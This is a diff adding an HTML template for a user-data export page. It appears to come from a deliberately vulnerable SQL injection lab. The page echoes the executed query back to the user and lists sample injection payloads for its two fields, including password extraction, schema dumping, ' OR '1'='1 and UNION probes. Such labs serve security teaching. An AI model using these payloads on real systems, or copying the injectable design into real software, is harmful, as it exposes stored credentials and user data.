@@ -1,0 +1,71 @@
+<div class="export-container">
+    <h2>Export User Data</h2>
+    
+    {{#if error}}
+    <div class="error-message">
+        {{error}}
+    </div>
+    {{/if}}
+    
+    <div class="export-form">
+        <form action="/export" method="GET">
+            <div class="form-group">
+                <label for="field">Fields to Export:</label>
+                <input type="text" id="field" name="field" value="{{field}}" placeholder="id,username">
+            </div>
+            <div class="form-group">
+                <label for="filter">Filter Users (username):</label>
+                <input type="text" id="filter" name="filter" value="{{filter}}" placeholder="Enter filter...">
+            </div>
+            <button type="submit" class="btn-export">Export Data</button>
+        </form>
+    </div>
+    
+    {{#if data}}
+    <div class="export-results">
+        <h3>Results:</h3>
+        <div class="query-display">
+            <p><strong>Query used:</strong> <code>{{query}}</code></p>
+        </div>
+        <table>
+            <thead>
+                <tr>
+                    {{#each data.[0]}}
+                    <th>{{@key}}</th>
+                    {{/each}}
+                </tr>
+            </thead>
+            <tbody>
+                {{#each data}}
+                <tr>
+                    {{#each this}}
+                    <td>{{this}}</td>
+                    {{/each}}
+                </tr>
+                {{/each}}
+            </tbody>
+        </table>
+    </div>
+    {{/if}}
+    
+    <div class="sqli-examples">
+        <h3>SQL Injection Examples:</h3>
+        <p>Try these SQLi payloads in the Fields to Export input:</p>
+        <ul>
+            <li><code>id,username,password</code> - Export passwords along with usernames</li>
+            <li><code>username FROM users; SELECT sqlite_version() AS username --</code> - Retrieve SQLite version</li>
+            <li><code>* FROM sqlite_master WHERE type='table' --</code> - Retrieve database schema information</li>
+        </ul>
+        <p>And in the Filter input:</p>
+        <ul>
+            <li><code>' OR '1'='1</code> - Show all users regardless of filter</li>
+            <li><code>' UNION SELECT 1,2,3 --</code> - Test for UNION injection (when selecting 3 fields)</li>
+            <li><code>' UNION SELECT NULL,NULL,'vulnerable' --</code> - Determine which fields allow string data</li>
+        </ul>
+    </div>
+    
+    <div class="navigation">
+        <a href="/" class="btn-secondary">Back to Dashboard</a>
+        <a href="/logout" class="btn-logout">Logout</a>
+    </div>
+</div>
